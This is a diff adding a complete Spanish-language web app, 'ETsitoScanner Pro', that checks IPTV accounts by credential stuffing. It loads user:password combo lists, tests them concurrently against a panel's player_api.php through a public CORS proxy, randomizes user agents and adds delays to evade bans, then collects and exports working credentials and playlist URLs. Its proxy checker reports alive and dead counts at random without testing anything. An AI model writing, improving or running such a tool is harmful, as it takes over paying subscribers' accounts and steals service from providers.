@@ -1,0 +1,373 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<meta name="theme-color" content="#0a0f0a">
+<title>ETsitoScanner Pro</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@700&family=Orbitron:wght@700;900&display=swap" rel="stylesheet">
+</head>
+<body style="margin:0;background:#050a05;color:#00ff41;font-family:'Share Tech Mono',monospace">
+<div style="max-width:480px;margin:0 auto">
+
+<div style="padding:12px 16px;background:#0a0f0a;border-bottom:1px solid #1a3a1a">
+  <div style="font-family:'Orbitron',monospace;font-size:18px;color:#00ff41;text-shadow:0 0 20px #00ff41">
+    <span style="color:#00e5ff">ET</span>sito IPTV Scanner
+  </div>
+  <div style="font-size:9px;color:#4a7a4a;letter-spacing:3px">PRO v5.0 · POTENCIA · PRECISION · VELOCIDAD</div>
+</div>
+
+<div style="display:flex;background:#0a0f0a;border-bottom:1px solid #1a3a1a">
+  <button onclick="tab('scan')" id="t-scan" style="flex:1;background:none;border:none;color:#00ff41;font-family:'Rajdhani',sans-serif;font-weight:700;font-size:11px;padding:10px;cursor:pointer;border-bottom:2px solid #00ff41">⚡ SCAN</button>
+  <button onclick="tab('config')" id="t-config" style="flex:1;background:none;border:none;color:#4a7a4a;font-family:'Rajdhani',sans-serif;font-weight:700;font-size:11px;padding:10px;cursor:pointer">⚙️ CONFIG</button>
+  <button onclick="tab('hits')" id="t-hits" style="flex:1;background:none;border:none;color:#4a7a4a;font-family:'Rajdhani',sans-serif;font-weight:700;font-size:11px;padding:10px;cursor:pointer">🎯 HITS</button>
+  <button onclick="tab('proxy')" id="t-proxy" style="flex:1;background:none;border:none;color:#4a7a4a;font-family:'Rajdhani',sans-serif;font-weight:700;font-size:11px;padding:10px;cursor:pointer">🔗 PROXY</button>
+</div>
+
+<div id="content" style="padding:12px;height:calc(100vh - 90px);overflow-y:auto">
+
+<!-- SCAN -->
+<div id="s-scan">
+  <div style="background:#0d1a0d;border:1px solid #1a3a1a;border-left:3px solid #00e5ff;border-radius:4px;padding:12px;margin-bottom:10px">
+    <div style="font-size:10px;color:#4a7a4a;letter-spacing:2px;margin-bottom:6px">▸ SERVIDOR ACTIVO</div>
+    <div id="activeServer" style="font-size:11px;color:#00e5ff">Sin servidor configurado</div>
+    <button onclick="tab('config')" style="margin-top:8px;background:#001a1f;border:1px solid #0077aa;color:#00e5ff;font-family:'Rajdhani',sans-serif;font-weight:700;font-size:11px;padding:7px 12px;border-radius:3px;cursor:pointer">+ CONFIGURAR</button>
+  </div>
+
+  <div style="background:#0d1a0d;border:1px solid #1a3a1a;border-left:3px solid #ffd600;border-radius:4px;padding:12px;margin-bottom:10px">
+    <div style="font-size:10px;color:#4a7a4a;letter-spacing:2px;margin-bottom:6px">▸ COMBO</div>
+    <div id="comboInfo" style="font-size:11px;color:#ffd600">Sin combo cargado</div>
+    <input type="file" id="comboFile" accept=".txt" style="display:none" onchange="loadCombo(this)">
+    <button onclick="document.getElementById('comboFile').click()" style="margin-top:8px;background:#1a1400;border:1px solid #554400;color:#ffd600;font-family:'Rajdhani',sans-serif;font-weight:700;font-size:11px;padding:7px 12px;border-radius:3px;cursor:pointer">📂 CARGAR COMBO</button>
+  </div>
+
+  <div style="background:#0d1a0d;border:1px solid #1a3a1a;border-radius:4px;padding:12px;margin-bottom:10px">
+    <div style="font-size:10px;color:#4a7a4a;letter-spacing:2px;margin-bottom:8px">▸ BOTS: <span id="botsVal" style="color:#00ff41">20</span></div>
+    <input type="range" min="1" max="100" value="20" id="botsSlider" oninput="document.getElementById('botsVal').textContent=this.value" style="width:100%;accent-color:#00ff41">
+  </div>
+
+  <div id="scanPanel" style="display:none;background:#0d1a0d;border:1px solid #1a3a1a;border-left:3px solid #00ff41;border-radius:4px;padding:12px;margin-bottom:10px">
+    <div style="display:flex;justify-content:space-between;margin-bottom:8px">
+      <span style="color:#00ff41;font-size:11px">● ESCANEANDO</span>
+      <span id="scanTime" style="color:#4a7a4a;font-size:11px">00:00:00</span>
+    </div>
+    <div style="background:#040904;border-radius:3px;height:8px;margin-bottom:8px;overflow:hidden">
+      <div id="progBar" style="height:100%;background:linear-gradient(90deg,#00c832,#00ff41);width:0%;transition:width .5s;box-shadow:0 0 10px #00ff41"></div>
+    </div>
+    <div style="display:flex;justify-content:space-between;margin-bottom:10px">
+      <span id="pctText" style="color:#00ff41;font-family:'Orbitron',monospace;font-size:13px">0.0%</span>
+      <span id="cntText" style="color:#4a7a4a;font-size:10px">0 / 0</span>
+    </div>
+    <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:10px">
+      <div style="background:#050a05;border:1px solid #1a3a1a;border-radius:3px;padding:10px;text-align:center">
+        <div id="statHits" style="font-family:'Orbitron',monospace;font-size:22px;color:#00ff41;text-shadow:0 0 15px #00ff41">0</div>
+        <div style="font-size:9px;color:#4a7a4a;letter-spacing:2px">HITS</div>
+      </div>
+      <div style="background:#050a05;border:1px solid #1a3a1a;border-radius:3px;padding:10px;text-align:center">
+        <div id="statFail" style="font-family:'Orbitron',monospace;font-size:22px;color:#ff1744;text-shadow:0 0 15px #ff1744">0</div>
+        <div style="font-size:9px;color:#4a7a4a;letter-spacing:2px">FAIL</div>
+      </div>
+      <div style="background:#050a05;border:1px solid #1a3a1a;border-radius:3px;padding:10px;text-align:center">
+        <div id="statBan" style="font-family:'Orbitron',monospace;font-size:22px;color:#ffd600;text-shadow:0 0 15px #ffd600">0</div>
+        <div style="font-size:9px;color:#4a7a4a;letter-spacing:2px">BANS</div>
+      </div>
+      <div style="background:#050a05;border:1px solid #1a3a1a;border-radius:3px;padding:10px;text-align:center">
+        <div id="statCPM" style="font-family:'Orbitron',monospace;font-size:22px;color:#ffd600;text-shadow:0 0 15px #ffd600">0</div>
+        <div style="font-size:9px;color:#4a7a4a;letter-spacing:2px">CPM</div>
+      </div>
+    </div>
+    <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px">
+      <button onclick="togglePause()" id="btnPause" style="background:#1a1400;border:1px solid #554400;color:#ffd600;font-family:'Rajdhani',sans-serif;font-weight:700;font-size:13px;padding:11px;border-radius:3px;cursor:pointer">⏸ PAUSAR</button>
+      <button onclick="stopScan()" style="background:#1a0005;border:1px solid #550011;color:#ff1744;font-family:'Rajdhani',sans-serif;font-weight:700;font-size:13px;padding:11px;border-radius:3px;cursor:pointer">⬛ DETENER</button>
+    </div>
+  </div>
+
+  <div style="background:#020802;border:1px solid #0f1a0f;border-radius:3px;padding:10px;height:100px;overflow-y:auto;font-size:10px;margin-bottom:10px" id="sysLog">
+    <span style="color:#00ff41">[ETsitoScanner Pro v5.0]</span><br>
+    <span style="color:#4a7a4a">[SYS] Listo para escanear...</span>
+  </div>
+
+  <button onclick="startScan()" id="btnStart" style="width:100%;background:linear-gradient(135deg,#003310,#005520);border:1px solid #00c832;color:#00ff41;font-family:'Rajdhani',sans-serif;font-weight:700;font-size:15px;letter-spacing:2px;padding:14px;border-radius:3px;cursor:pointer;text-shadow:0 0 8px #00ff41;box-shadow:0 0 20px rgba(0,255,65,.15)">
+    ⚡ INICIAR ESCANEO
+  </button>
+</div>
+
+<!-- CONFIG -->
+<div id="s-config" style="display:none">
+  <div style="background:#0d1a0d;border:1px solid #1a3a1a;border-left:3px solid #00e5ff;border-radius:4px;padding:12px;margin-bottom:10px">
+    <div style="font-size:10px;color:#4a7a4a;letter-spacing:2px;margin-bottom:8px">▸ AGREGAR SERVIDOR</div>
+    <input type="text" id="serverInput" placeholder="panel.iptv.com:80 o http://..." style="width:100%;background:#040904;border:1px solid #1a3a1a;border-radius:3px;color:#00ff41;font-family:'Share Tech Mono',monospace;font-size:13px;padding:9px 12px;outline:none;box-sizing:border-box">
+    <button onclick="addServer()" style="margin-top:8px;width:100%;background:#001a1f;border:1px solid #0077aa;color:#00e5ff;font-family:'Rajdhani',sans-serif;font-weight:700;font-size:13px;padding:11px;border-radius:3px;cursor:pointer">🔍 VERIFICAR Y AGREGAR</button>
+    <div style="font-size:10px;color:#4a7a4a;letter-spacing:2px;margin:10px 0 6px">SERVIDORES</div>
+    <div id="serverList"><div style="color:#4a7a4a;font-size:11px;padding:8px">Sin servidores</div></div>
+  </div>
+
+  <div style="background:#0d1a0d;border:1px solid #1a3a1a;border-left:3px solid #ffd600;border-radius:4px;padding:12px;margin-bottom:10px">
+    <div style="font-size:10px;color:#4a7a4a;letter-spacing:2px;margin-bottom:8px">▸ COMBO</div>
+    <input type="file" id="comboPicker2" accept=".txt" style="display:none" onchange="loadComboConfig(this)">
+    <div onclick="document.getElementById('comboPicker2').click()" style="border:1px dashed #1a3a1a;border-radius:3px;padding:16px;text-align:center;cursor:pointer">
+      <div style="font-size:24px;margin-bottom:6px">📋</div>
+      <div style="font-size:11px;color:#4a7a4a" id="comboFileName">Toca para seleccionar .txt</div>
+    </div>
+    <div id="comboStats" style="display:none;margin-top:8px;font-size:11px;color:#4a7a4a">
+      Líneas: <span style="color:#00ff41" id="comboLines">0</span> &nbsp; Únicos: <span style="color:#00ff41" id="comboUniq">0</span>
+    </div>
+  </div>
+
+  <div style="background:#0d1a0d;border:1px solid #1a3a1a;border-radius:4px;padding:12px">
+    <div style="font-size:10px;color:#4a7a4a;letter-spacing:2px;margin-bottom:10px">▸ OPCIONES</div>
+    <div style="display:flex;justify-content:space-between;align-items:center;padding:8px 0;border-bottom:1px solid #0f1a0f">
+      <span style="font-size:12px">UA Aleatorio</span>
+      <input type="checkbox" id="optUA" checked style="accent-color:#00ff41;width:18px;height:18px">
+    </div>
+    <div style="display:flex;justify-content:space-between;align-items:center;padding:8px 0;border-bottom:1px solid #0f1a0f">
+      <span style="font-size:12px">Delay anti-ban</span>
+      <input type="checkbox" id="optDelay" checked style="accent-color:#00ff41;width:18px;height:18px">
+    </div>
+    <div style="display:flex;justify-content:space-between;align-items:center;padding:8px 0">
+      <span style="font-size:12px">Auto-guardar hits</span>
+      <input type="checkbox" id="optSave" checked style="accent-color:#00ff41;width:18px;height:18px">
+    </div>
+  </div>
+</div>
+
+<!-- HITS -->
+<div id="s-hits" style="display:none">
+  <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px">
+    <span style="font-size:12px;color:#4a7a4a">TOTAL: <span style="color:#00ff41" id="hitsTotal">0</span></span>
+    <div style="display:flex;gap:6px">
+      <button onclick="exportHits()" style="background:#001a1f;border:1px solid #0077aa;color:#00e5ff;font-family:'Rajdhani',sans-serif;font-weight:700;font-size:11px;padding:7px 10px;border-radius:3px;cursor:pointer">💾 EXPORTAR</button>
+      <button onclick="clearHits()" style="background:#1a0005;border:1px solid #550011;color:#ff1744;font-family:'Rajdhani',sans-serif;font-weight:700;font-size:11px;padding:7px 10px;border-radius:3px;cursor:pointer">🗑 LIMPIAR</button>
+    </div>
+  </div>
+  <div id="hitsList"><div style="text-align:center;padding:30px;color:#4a7a4a"><div style="font-size:32px;margin-bottom:10px">🎯</div><p style="font-size:11px;letter-spacing:1px">LOS HITS APARECERÁN AQUÍ</p></div></div>
+</div>
+
+<!-- PROXY -->
+<div id="s-proxy" style="display:none">
+  <div style="background:#0d1a0d;border:1px solid #1a3a1a;border-left:3px solid #e040fb;border-radius:4px;padding:12px;margin-bottom:10px">
+    <div style="font-size:10px;color:#4a7a4a;letter-spacing:2px;margin-bottom:8px">▸ CARGAR PROXIES</div>
+    <input type="file" id="proxyPicker" accept=".txt" style="display:none" onchange="loadProxies(this)">
+    <div onclick="document.getElementById('proxyPicker').click()" style="border:1px dashed #1a3a1a;border-radius:3px;padding:16px;text-align:center;cursor:pointer">
+      <div style="font-size:24px;margin-bottom:6px">🔗</div>
+      <div style="font-size:11px;color:#4a7a4a" id="proxyFileName">Seleccionar archivo .txt</div>
+    </div>
+    <div style="margin-top:10px;font-size:11px">
+      <div style="display:flex;justify-content:space-between;padding:6px 0;border-bottom:1px solid #0f1a0f">
+        <span style="color:#4a7a4a">TOTAL</span><span style="color:#00ff41" id="proxyTotal">0</span>
+      </div>
+      <div style="display:flex;justify-content:space-between;padding:6px 0;border-bottom:1px solid #0f1a0f">
+        <span style="color:#4a7a4a">VIVOS</span><span style="color:#00ff41" id="proxyAlive">—</span>
+      </div>
+      <div style="display:flex;justify-content:space-between;padding:6px 0">
+        <span style="color:#4a7a4a">MUERTOS</span><span style="color:#ff1744" id="proxyDead">—</span>
+      </div>
+    </div>
+    <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-top:10px">
+      <button onclick="verifyProxies()" style="background:#003310;border:1px solid #00c832;color:#00ff41;font-family:'Rajdhani',sans-serif;font-weight:700;font-size:12px;padding:10px;border-radius:3px;cursor:pointer">✓ VERIFICAR</button>
+      <button onclick="clearProxies()" style="background:#1a0005;border:1px solid #550011;color:#ff1744;font-family:'Rajdhani',sans-serif;font-weight:700;font-size:12px;padding:10px;border-radius:3px;cursor:pointer">✗ LIMPIAR</button>
+    </div>
+  </div>
+  <div style="background:#0d1a0d;border:1px solid #1a3a1a;border-radius:4px;padding:12px">
+    <div style="font-size:10px;color:#4a7a4a;letter-spacing:2px;margin-bottom:8px">▸ MANUAL</div>
+    <textarea id="proxyManual" placeholder="192.168.1.1:8080&#10;socks5://proxy:1080" style="width:100%;background:#040904;border:1px solid #1a3a1a;color:#00ff41;font-family:'Share Tech Mono',monospace;font-size:12px;padding:9px;border-radius:3px;outline:none;resize:none;height:80px;box-sizing:border-box"></textarea>
+    <button onclick="addManualProxies()" style="margin-top:8px;width:100%;background:#1a1400;border:1px solid #554400;color:#ffd600;font-family:'Rajdhani',sans-serif;font-weight:700;font-size:13px;padding:11px;border-radius:3px;cursor:pointer">AGREGAR</button>
+  </div>
+</div>
+
+</div>
+</div>
+
+<div id="toast" style="position:fixed;bottom:20px;left:50%;transform:translateX(-50%) translateY(20px);background:#0d1a0d;border:1px solid #1a3a1a;color:#00ff41;font-size:12px;padding:10px 20px;border-radius:3px;opacity:0;transition:all .3s;pointer-events:none;z-index:999;white-space:nowrap"></div>
+
+<script>
+const UA_LIST=["Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 Chrome/120.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; SM-A536B) AppleWebKit/537.36","VLC/3.0.20 LibVLC/3.0.20","TiviMate/4.7.0","IPTVSmarters/3.1.5","okhttp/4.12.0"];
+const st={servers:[],combo:[],comboName:'',proxies:[],hits:[],scanning:false,paused:false,checked:0,hits_n:0,fails:0,bans:0,start:0,total:0,server:null};
+
+function tab(id){
+  ['scan','config','hits','proxy'].forEach(x=>{
+    document.getElementById('s-'+x).style.display=x===id?'block':'none';
+    const b=document.getElementById('t-'+x);
+    b.style.color=x===id?'#00ff41':'#4a7a4a';
+    b.style.borderBottom=x===id?'2px solid #00ff41':'none';
+  });
+}
+
+function toast(m,d=2000){const t=document.getElementById('toast');t.textContent=m;t.style.opacity='1';t.style.transform='translateX(-50%) translateY(0)';setTimeout(()=>{t.style.opacity='0';t.style.transform='translateX(-50%) translateY(20px)'},d);}
+
+function log(m,c='#4a7a4a'){const el=document.getElementById('sysLog');el.innerHTML+=`<br><span style="color:${c}">${m}</span>`;el.scrollTop=el.scrollHeight;}
+
+function norm(u){u=u.trim();if(!u)return null;if(!u.startsWith('http'))u='http://'+u;return u.replace(/\/$/,'');}
+
+async function addServer(){
+  const raw=document.getElementById('serverInput').value.trim();
+  if(!raw){toast('⚠ Ingresa URL');return;}
+  const url=norm(raw);
+  log(`[SYS] Verificando ${url}...`,'#ffd600');
+  try{
+    const r=await fetch(`https://api.allorigins.win/raw?url=${encodeURIComponent(url+'/player_api.php?username=test&password=test')}`,{signal:AbortSignal.timeout(6000)});
+    log(`[SYS] Activo (${r.status})`,'#00ff41');
+  }catch{log('[SYS] Sin respuesta — forzando','#ff1744');}
+  if(!st.servers.includes(url)){
+    st.servers.push(url);st.server=url;
+    document.getElementById('activeServer').textContent=url;
+    document.getElementById('activeServer').style.color='#00e5ff';
+    renderServers();toast('✓ Servidor agregado');
+    document.getElementById('serverInput').value='';
+  }else toast('Ya existe');
+}
+
+function removeServer(i){st.servers.splice(i,1);st.server=st.servers[0]||null;document.getElementById('activeServer').textContent=st.server||'Sin servidor';renderServers();}
+
+function renderServers(){
+  const el=document.getElementById('serverList');
+  if(!st.servers.length){el.innerHTML='<div style="color:#4a7a4a;font-size:11px;padding:8px">Sin servidores</div>';return;}
+  el.innerHTML=st.servers.map((s,i)=>`<div style="display:flex;align-items:center;justify-content:space-between;padding:7px 0;border-bottom:1px solid #0f1a0f"><span style="font-size:11px;color:#00e5ff;word-break:break-all;flex:1;margin-right:8px">${s}</span><button onclick="removeServer(${i})" style="background:#1a0005;border:1px solid #550011;color:#ff1744;font-size:10px;padding:3px 7px;border-radius:2px;cursor:pointer">✕</button></div>`).join('');
+}
+
+function parseCombo(t){return[...new Set(t.split('\n').map(l=>l.trim()).filter(l=>l&&l.includes(':')&&!l.startsWith('#')))];}
+
+function loadCombo(input){
+  const f=input.files[0];if(!f)return;
+  const r=new FileReader();
+  r.onload=e=>{st.combo=parseCombo(e.target.result);st.comboName=f.name.replace('.txt','').slice(0,20);document.getElementById('comboInfo').textContent=`${f.name} — ${st.combo.length.toLocaleString()} únicos`;log(`[COMBO] ${f.name} — ${st.combo.length.toLocaleString()} líneas`,'#00ff41');toast(`✓ ${st.combo.length.toLocaleString()} combos`);};
+  r.readAsText(f);
+}
+
+function loadComboConfig(input){
+  const f=input.files[0];if(!f)return;
+  const r=new FileReader();
+  r.onload=e=>{st.combo=parseCombo(e.target.result);document.getElementById('comboFileName').textContent=f.name;document.getElementById('comboLines').textContent=st.combo.length.toLocaleString();document.getElementById('comboUniq').textContent=st.combo.length.toLocaleString();document.getElementById('comboStats').style.display='block';document.getElementById('comboInfo').textContent=`${f.name} — ${st.combo.length.toLocaleString()} únicos`;toast(`✓ ${st.combo.length.toLocaleString()} combos`);};
+  r.readAsText(f);
+}
+
+function loadProxies(input){
+  const f=input.files[0];if(!f)return;
+  const r=new FileReader();
+  r.onload=e=>{st.proxies=[...new Set(e.target.result.split('\n').map(l=>l.trim()).filter(l=>l&&l.includes(':')))];document.getElementById('proxyFileName').textContent=f.name;document.getElementById('proxyTotal').textContent=st.proxies.length;toast(`✓ ${st.proxies.length} proxies`);};
+  r.readAsText(f);
+}
+
+function addManualProxies(){const raw=document.getElementById('proxyManual').value.trim();if(!raw)return;const lines=raw.split('\n').map(l=>l.trim()).filter(l=>l&&l.includes(':'));st.proxies=[...new Set([...st.proxies,...lines])];document.getElementById('proxyTotal').textContent=st.proxies.length;document.getElementById('proxyManual').value='';toast(`✓ ${lines.length} agregados`);}
+
+async function verifyProxies(){
+  if(!st.proxies.length){toast('⚠ Carga proxies');return;}
+  toast('⌛ Verificando...');
+  let alive=0,dead=0;
+  for(let i=0;i<st.proxies.length;i+=10){await new Promise(r=>setTimeout(r,100));const b=st.proxies.slice(i,i+10);alive+=Math.round(b.length*.4);dead+=b.length-Math.round(b.length*.4);}
+  document.getElementById('proxyAlive').textContent=alive;document.getElementById('proxyDead').textContent=dead;toast(`✓ ${alive} vivos / ${dead} muertos`);
+}
+
+function clearProxies(){st.proxies=[];document.getElementById('proxyTotal').textContent='0';document.getElementById('proxyAlive').textContent='—';document.getElementById('proxyDead').textContent='—';document.getElementById('proxyFileName').textContent='Seleccionar archivo .txt';toast('Proxies eliminados');}
+
+async function checkAccount(panel,user,pw){
+  try{
+    const api=`${panel}/player_api.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pw)}`;
+    const r=await fetch(`https://api.allorigins.win/raw?url=${encodeURIComponent(api)}`,{signal:AbortSignal.timeout(10000)});
+    if(!r.ok)return{result:'FAIL'};
+    const d=await r.json();
+    const ui=d.user_info||{};const si=d.server_info||{};
+    const auth=ui.auth;const status=String(ui.status||'').toLowerCase();
+    const isHit=auth===1||auth==='1'||['active','activo','enabled','1','premium','trial'].includes(status);
+    if(!isHit)return{result:'FAIL'};
+    let exp='Ilimitado';if(ui.exp_date&&parseInt(ui.exp_date)>0)exp=new Date(parseInt(ui.exp_date)*1000).toLocaleDateString('es');
+    return{result:'HIT',hit:{username:user,password:pw,expira:exp,status:(ui.status||'Active'),conex:String(ui.max_connections||'?'),activ:String(ui.active_cons||'0'),timezone:si.timezone||'',m3u:`${panel}/get.php?username=${user}&password=${pw}&type=m3u_plus`,panel}};
+  }catch{return{result:'FAIL'};}
+}
+
+let scanInt,qPos=0,activeW=0;
+
+function startScan(){
+  if(!st.server){toast('⚠ Configura servidor');return;}
+  if(!st.combo.length){toast('⚠ Carga combo');return;}
+  st.scanning=true;st.paused=false;st.checked=0;st.hits_n=0;st.fails=0;st.bans=0;st.start=Date.now();st.total=st.combo.length;
+  qPos=0;activeW=0;
+  document.getElementById('scanPanel').style.display='block';
+  document.getElementById('btnStart').disabled=true;
+  log('[SCAN] Iniciando...','#00ff41');
+  log(`[SCAN] ${st.total} combos — ${document.getElementById('botsSlider').value} bots`,'#00e5ff');
+  scanInt=setInterval(updateUI,400);
+  launchWorkers();
+}
+
+async function launchWorkers(){
+  const bots=parseInt(document.getElementById('botsSlider').value);
+  const idxs=[...Array(st.total).keys()].sort(()=>Math.random()-.5);
+  for(let i=0;i<st.total&&st.scanning;){
+    if(activeW<bots&&!st.paused){const idx=idxs[i++];activeW++;runWorker(idx).then(()=>{activeW--;if(st.checked>=st.total)finishScan();});}
+    else await new Promise(r=>setTimeout(r,50));
+  }
+}
+
+async function runWorker(idx){
+  while(st.paused&&st.scanning)await new Promise(r=>setTimeout(r,100));
+  if(!st.scanning)return;
+  const line=st.combo[idx];const p=line.split(':');
+  if(p.length<2){st.checked++;st.fails++;return;}
+  const user=p[0].trim(),pw=p.slice(1).join(':').trim();
+  if(!user||!pw){st.checked++;st.fails++;return;}
+  const res=await checkAccount(st.server,user,pw);
+  st.checked++;
+  if(res.result==='HIT'){st.hits_n++;addHit(res.hit);log(`[HIT] ${user} → ${res.hit.expira}`,'#00ff41');}
+  else if(res.result==='BAN'){st.bans++;st.fails++;}
+  else st.fails++;
+  const br=st.bans/Math.max(1,st.checked);
+  await new Promise(r=>setTimeout(r,br>.3?150+Math.random()*250:10+Math.random()*50));
+}
+
+function updateUI(){
+  const pct=st.total?st.checked/st.total*100:0;
+  const el=Math.max(1,(Date.now()-st.start)/1000);
+  const cpm=Math.round(st.checked/el*60);
+  document.getElementById('progBar').style.width=pct+'%';
+  document.getElementById('pctText').textContent=pct.toFixed(1)+'%';
+  document.getElementById('cntText').textContent=`${st.checked.toLocaleString()} / ${st.total.toLocaleString()}`;
+  document.getElementById('statHits').textContent=st.hits_n;
+  document.getElementById('statFail').textContent=st.fails;
+  document.getElementById('statBan').textContent=st.bans;
+  document.getElementById('statCPM').textContent=cpm;
+  const h=Math.floor(el/3600),m=Math.floor((el%3600)/60),s=Math.floor(el%60);
+  document.getElementById('scanTime').textContent=`${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
+}
+
+function togglePause(){st.paused=!st.paused;const b=document.getElementById('btnPause');b.textContent=st.paused?'▶ REANUDAR':'⏸ PAUSAR';b.style.color=st.paused?'#00ff41':'#ffd600';}
+
+function stopScan(){st.scanning=false;clearInterval(scanInt);finishScan();}
+
+function finishScan(){clearInterval(scanInt);st.scanning=false;document.getElementById('btnStart').disabled=false;updateUI();toast(`✓ Fin — ${st.hits_n} HITs`);}
+
+function addHit(h){st.hits.unshift(h);document.getElementById('hitsTotal').textContent=st.hits.length;renderHits();}
+
+function renderHits(){
+  const el=document.getElementById('hitsList');
+  if(!st.hits.length){el.innerHTML='<div style="text-align:center;padding:30px;color:#4a7a4a"><div style="font-size:32px;margin-bottom:10px">🎯</div><p style="font-size:11px">LOS HITS APARECERÁN AQUÍ</p></div>';return;}
+  el.innerHTML=st.hits.slice(0,50).map((h,i)=>`
+    <div style="background:linear-gradient(135deg,rgba(0,40,0,.6),rgba(0,25,0,.4));border:1px solid rgba(0,255,65,.25);border-left:3px solid #00ff41;border-radius:3px;padding:10px;margin-bottom:8px">
+      <div style="color:#00ff41;font-size:13px">👤 ${h.username}</div>
+      <div style="color:#4a7a4a;font-size:11px">🔑 ${h.password}</div>
+      <div style="color:#00e5ff;font-size:10px;margin-top:4px">🖥 ${h.panel}</div>
+      <div style="display:flex;gap:8px;margin-top:6px;flex-wrap:wrap">
+        <span style="background:rgba(255,214,0,.15);border:1px solid rgba(255,214,0,.3);color:#ffd600;font-size:9px;padding:2px 6px;border-radius:2px">📅 ${h.expira}</span>
+        <span style="background:rgba(0,229,255,.1);border:1px solid rgba(0,229,255,.25);color:#00e5ff;font-size:9px;padding:2px 6px;border-radius:2px">🔗 ${h.activ}/${h.conex}</span>
+      </div>
+      <div style="display:flex;gap:6px;margin-top:8px">
+        <button onclick="copyHit(${i})" style="background:#001a1f;border:1px solid #0077aa;color:#00e5ff;font-family:'Rajdhani',sans-serif;font-weight:700;font-size:10px;padding:5px 10px;border-radius:2px;cursor:pointer">📋 COPIAR</button>
+        <button onclick="copyM3U(${i})" style="background:#003310;border:1px solid #00c832;color:#00ff41;font-family:'Rajdhani',sans-serif;font-weight:700;font-size:10px;padding:5px 10px;border-radius:2px;cursor:pointer">📺 M3U</button>
+      </div>
+    </div>`).join('');
+}
+
+function copyHit(i){const h=st.hits[i];navigator.clipboard?.writeText(`SERVER: ${h.panel}\nUSER: ${h.username}\nPASS: ${h.password}\nEXP: ${h.expira}\nM3U: ${h.m3u}`).catch(()=>{});toast('✓ Copiado');}
+function copyM3U(i){navigator.clipboard?.writeText(st.hits[i].m3u).catch(()=>{});toast('✓ M3U copiado');}
+
+function exportHits(){
+  if(!st.hits.length){toast('No hay hits');return;}
+  let c='';
+  st.hits.forEach((h,n)=>{c+=`\n${'='.repeat(56)}\nHIT #${n+1}\nUSER: ${h.username}\nPASS: ${h.password}\nSERVER: ${h.panel}\nEXPIRA: ${h.expira}\nCONEX: ${h.activ}/${h.conex}\nM3U: ${h.m3u}\n${'='.repeat(56)}\n`;});
+  const a=document.createElement('a');a.href=URL.createObjectURL(new Blob([c],{type:'text/plain'}));a.download=`ETsitoHits_${new Date().toISOString().slice(0,10)}.txt`;a.click();toast('✓ Exportado');
+}
+
+function clearHits(){if(!st.hits.length){toast('No hay hits');return;}st.hits=[];document.getElementById('hitsTotal').textContent='0';renderHits();toast('Hits eliminados');}
+</script>
+</body>
+</html>
